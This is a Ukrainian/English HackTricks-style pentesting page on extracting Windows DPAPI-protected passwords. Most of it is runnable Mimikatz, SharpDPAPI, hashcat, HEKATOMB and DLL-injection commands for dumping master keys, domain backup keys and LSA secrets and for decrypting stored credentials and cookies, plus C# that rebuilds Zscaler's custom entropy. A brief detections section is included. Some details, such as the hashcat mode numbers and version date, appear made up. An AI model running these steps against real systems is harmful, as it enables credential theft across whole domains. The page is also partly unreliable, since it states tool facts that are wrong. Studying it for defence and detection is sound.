# DPAPI - Витяг паролів

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Users key generation

The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. This key is derived from the user's password and other factors and the algorithm depends on the type of user but ends being a SHA1. For example, for domain users, **it depends on the NTLM hash of the user**.

This is specially interesting because if an attacker can obtain the user's password hash, they can:

- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
- Try to **crack the password** offline trying to generate the valid DPAPI key

Moreover, every time some data is encrypted by a user using DPAPI, a new **master key** is generated. This master key is the one actually used to encrypt data. Each master key is given with a **GUID** (Globally Unique Identifier) that identifies it.

The master keys are stored in the **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, where `{SID}` is the Security Identifier of that user. The master key is stored encrypted by the user's **`pre-key`** and also by a **domain backup key** for recovery (so the same key is stored encrypted 2 times by 2 different pass).

Note that the **domain key used to encrypt the master key is in the domain controllers and never changes**, so if an attacker has access to the domain controller, they can retrieve the domain backup key and decrypt the master keys of all users in the domain.

The encrypted blobs contain the **GUID of the master key** that was used to encrypt the data inside its headers.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Знайти master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Це ключ, який використовується машиною для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret**, який є спеціальним ключем, до якого може отримати доступ лише користувач SYSTEM. Цей ключ використовується для шифрування даних, які мають бути доступні самій системі, наприклад повноваження на рівні машини або системні секрети.

Зауважте, що ці ключі **не мають domain backup**, тому вони доступні лише локально:

- **Mimikatz** може отримати до нього доступ, дампуючи LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в реєстрі, тому адміністратор може **змінити DACL permissions, щоб отримати до нього доступ**. Шлях у реєстрі: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Серед персональних даних, захищених DPAPI, є:

- облікові дані Windows
- паролі та дані автозаповнення Internet Explorer і Google Chrome
- паролі від електронної пошти та внутрішніх FTP-акаунтів для застосунків, таких як Outlook і Windows Mail
- паролі для спільних папок, ресурсів, бездротових мереж та Windows Vault, включно з ключами шифрування
- паролі для підключень Remote Desktop, .NET Passport та приватні ключі для різних цілей шифрування й автентифікації
- мережні паролі, керовані Credential Manager, та персональні дані в застосунках, що використовують CryptProtectData, таких як Skype, MSN messenger тощо
- зашифровані бінарні блоки (blobs) у реєстрі
- ...

Дані, захищені системою, включають:
- паролі WiFi
- паролі запланованих завдань
- ...

### Master key extraction options

- Якщо користувач має привілеї domain admin, він може отримати доступ до **domain backup key**, щоб розшифрувати всі user master keys у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Маючи локальні права адміністратора, можна **access the LSASS memory** щоб витягти DPAPI master keys усіх підключених користувачів та SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні права адміністратора, він може отримати доступ до **DPAPI_SYSTEM LSA secret** для розшифрування machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо відомий пароль або NTLM-хеш користувача, ви можете **безпосередньо розшифрувати майстер-ключі користувача**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте всередині session як user, можна попросити DC про **backup key to decrypt the master keys using RPC**. Якщо ви local admin і user увійшов до системи, ви можете **steal his session token** для цього:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Знаходження зашифрованих даних DPAPI

Зазвичай **захищені** файли користувача знаходяться в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

Приклади енумерації:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити DPAPI зашифровані blobs у файловій системі, реєстрі та B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зауважте, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того ж репозиторію) можна використовувати для розшифрування за допомогою DPAPI конфіденційних даних, таких як cookies.

### Ключі доступу та дані

- **Use SharpDPAPI** щоб отримати credentials із файлів, зашифрованих DPAPI, з поточної сесії:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримати credentials info** такі як encrypted data та guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Розшифруйте masterkey користувача, який запитує **domain backup key**, використовуючи RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування masterkey (зверніть увагу, що можна використовувати `/rpc` щоб отримати ключ резервної копії домену, `/password` щоб використати пароль у відкритому тексті, або `/pvk` щоб вказати файл приватного ключа DPAPI домену...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані за допомогою masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зауважте, що можна використати `/rpc` щоб отримати резервний ключ домену, `/password` щоб використати пароль у відкритому вигляді, `/pvk` щоб вказати файл приватного ключа домену DPAPI, `/unprotect` щоб використати поточну сесію користувача...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Розшифрувати деякі дані, використовуючи **поточну сесію користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Обробка необов'язкової ентропії ("Third-party entropy")

Деякі програми передають додаткове значення **entropy** до `CryptProtectData`. Без цього значення blob не можна розшифрувати, навіть якщо відомий правильний masterkey. Отже, отримання **entropy** є необхідним при націлюванні на облікові дані, захищені таким чином (наприклад Microsoft Outlook, деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це user-mode DLL, яка перехоплює DPAPI-функції всередині цільового процесу та прозоро записує будь-яку додаткову entropy, що передається. Запуск EntropyCapture у режимі **DLL-injection** проти процесів, таких як `outlook.exe` або `vpnclient.exe`, виведе файл, який зіставляє кожний буфер entropy з викликаючим процесом і blob. Захоплену entropy пізніше можна передати до **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`) для розшифровки даних.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Злам masterkeys офлайн (Hashcat & DPAPISnoop)

Microsoft впровадила формат masterkey **context 3**, починаючи з Windows 10 v1607 (2016). `hashcat` v6.2.6 (грудень 2023) додав hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) та **22102** (context 3), що дозволяють GPU-прискорене зламування паролів користувачів безпосередньо з файлу masterkey. Тож нападники можуть виконувати атаки за словником або brute-force без взаємодії з цільовою системою.

`DPAPISnoop` (2024) автоматизує процес:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може розбирати Credential та Vault blobs, розшифровувати їх за допомогою зламаних ключів і експортувати паролі у відкритому вигляді.

### Доступ до даних іншої машини

У **SharpDPAPI and SharpChrome** можна вказати опцію **`/server:HOST`** для доступу до даних віддаленої машини. Звісно, потрібно мати доступ до тієї машини, і в наведеному нижче прикладі припускається, що **відомий ключ шифрування резервної копії домену**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — інструмент, що автоматизує витяг усіх користувачів і комп'ютерів з LDAP-довідника та отримання ключа резервної копії контролера домену через RPC. Скрипт потім резолвить IP-адреси всіх комп'ютерів і виконує smbclient на всіх машинах, щоб отримати всі DPAPI blob-и всіх користувачів та розшифрувати все за допомогою ключа резервної копії домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

За витягнутим зі LDAP списком комп'ютерів ви можете знайти кожну підмережу, навіть якщо раніше не знали про них!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично дампити секрети, захищені DPAPI. Реліз 2.x додав:

* Паралельний збір blobs з сотень хостів
* Парсинг **context 3** masterkeys та автоматична інтеграція з Hashcat для брутфорсу
* Підтримка Chrome "App-Bound" зашифрованих cookie (див. наступний розділ)
* Новий режим **`--snapshot`** для повторного опитування кінцевих точок і дифу щойно створених blob-ів

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — C# парсер для masterkey/credential/vault файлів, який може виводити формати для Hashcat/JtR та опціонально автоматично викликати cracking. Повністю підтримує machine та user masterkey формати до Windows 11 24H1.

## Загальні виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших DPAPI-пов'язаних директоріях.
- Особливо з мережевої шари, як **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам'яті LSASS або дампу masterkeys.
- Подія **4662**: *Виконано операцію над об'єктом* — може корелюватися з доступом до об'єкта **`BCKUPKEY`**.
- Події **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Уразливості 2023–2025 та зміни в екосистемі

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023). Атакувальник з мережею міг примусити член домену отримати шкідливий DPAPI backup key, що дозволяло розшифрувати user masterkeys. Виправлено в накопичувальному оновленні листопада 2023 — адміністратори повинні переконатися, що DC та робочі станції повністю пропатчені.
* **Chrome 127 “App-Bound” cookie encryption** (липень 2024) замінив стару захист лише на базі DPAPI додатковим ключем, що зберігається в **Credential Manager** користувача. Офлайн-розшифровка cookie тепер вимагає і DPAPI masterkey, і **GCM-wrapped app-bound key**. SharpChrome v2.3 та DonPAPI 2.x в змозі відновити додатковий ключ при запуску в контексті користувача.

### Кейс: Zscaler Client Connector – користувацька ентропія, що походить від SID

Zscaler Client Connector зберігає кілька конфігураційних файлів у `C:\ProgramData\Zscaler` (наприклад `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожен файл зашифрований за допомогою **DPAPI (Machine scope)**, але вендор постачає **custom entropy**, яка обчислюється під час виконання замість зберігання на диску.

Ентропія відновлюється з двох елементів:

1. Жорстко вбудований секрет, вбудований у `ZSACredentialProvider.dll`.
2. **SID** облікового запису Windows, якому належить конфігурація.

Алгоритм, реалізований у DLL, еквівалентний:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудований у DLL, який можна прочитати з диска, **будь-який локальний атакувальник з правами SYSTEM може відтворити ентропію для будь-якого SID** і розшифрувати blobs офлайн:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування повертає повну JSON-конфігурацію, включаючи кожну **перевірку стану пристрою** та її очікуване значення — інформацію, яка є дуже цінною при спробах обходу на боці клієнта.

> Порада: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені за допомогою DPAPI **без** ентропії (`16` нульових байтів). Їх можна, отже, розшифрувати прямо за допомогою `ProtectedData.Unprotect`, щойно отримано привілеї SYSTEM.

## Джерела

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
